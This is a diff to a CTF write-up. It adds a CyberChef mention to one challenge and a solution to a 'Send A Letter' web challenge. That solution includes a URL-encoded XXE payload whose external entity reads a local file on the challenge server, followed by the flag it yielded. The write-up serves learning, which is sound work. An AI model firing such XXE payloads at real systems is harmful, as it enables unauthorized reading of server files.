@@ -75,9 +75,29 @@ for c in a:
     s = s + c
 print(s)
 ```
-It's a png image  
+Using [Cyberchef](https://gchq.github.io/CyberChef/) to check this. It's a png image  
 ![img](https://lhtthao0430.github.io/web/tenable/FollowTheRabbitHole.png)  
 We got
 ```
 flag{automation_is_handy}
+```
+
+**[Send A Letter](http://challenges.ctfd.io:30471/)**  
+View source, in line 34 it send a get request  
+```
+$.get("send_letter.php?letter="+letter, function(data, status){
+			alert("Data: " + data + "\nStatus: " + status);
+		});
+```
+In line 13 it uses xml
+```
+var letter = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>";
+```
+We can use XXE attack
+```html
+xml%20version=%221.0%22%20encoding=%22ISO-8859-1%22?%3E%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///tmp/messages_outbound.txt%22%3E%20]%3E%3Cletter%3E%3Cname%3E%26xxe;%3C/name%3E%3C/letter%3E
+```
+We got the flag
+```
+flag{xxe_aww_yeah}
 ```
